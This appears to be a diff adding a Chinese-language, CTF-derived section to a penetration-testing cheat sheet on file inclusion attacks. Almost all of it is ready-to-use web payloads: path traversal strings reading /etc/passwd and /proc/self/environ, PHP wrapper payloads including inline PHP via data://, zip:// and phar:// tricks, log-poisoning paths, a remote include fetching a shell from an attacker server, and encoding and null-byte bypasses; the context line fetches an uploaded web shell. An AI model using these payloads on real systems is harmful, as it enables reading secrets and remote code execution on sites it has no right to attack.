@@ -389,3 +389,52 @@ curl "http://target.com/page?file=../uploads/shell.jpg"
 5. 检查是否支持 RFI
 6. 枚举敏感文件（配置文件、密钥、日志）
 7. 分析源码寻找更多漏洞
+
+---
+
+## 来自 CTF 经验积累
+
+### LFI 检测
+**基本测试**:
+- `?page=../../../etc/passwd`
+- `?page=php://filter/read=convert.base64-encode/resource=index.php`
+
+**常见文件**:
+- `/etc/passwd`
+- `/var/www/html/index.php`
+- `/proc/self/environ`
+- `/proc/self/cmdline`
+
+### PHP封装器
+```
+php://filter/read=convert.base64-encode/resource=flag.php
+php://input
+data://text/plain,<?php phpinfo();?>
+```
+
+### 日志包含
+```
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/proc/self/environ
+```
+
+### 伪协议
+```php://filter/read=convert.base64-encode/resource=flag.php
+zip://uploads/file.zip%23test.php
+phar://uploads/file.phar/test.php
+```
+
+### RFI利用
+当 `allow_url_include = On`:
+```
+?file=http://yourserver/shell.txt
+```
+
+### 常见绕过
+```
+....//....//etc/passwd
+..././..././etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL编码
+/etc/passwd%00  # 截断
+```
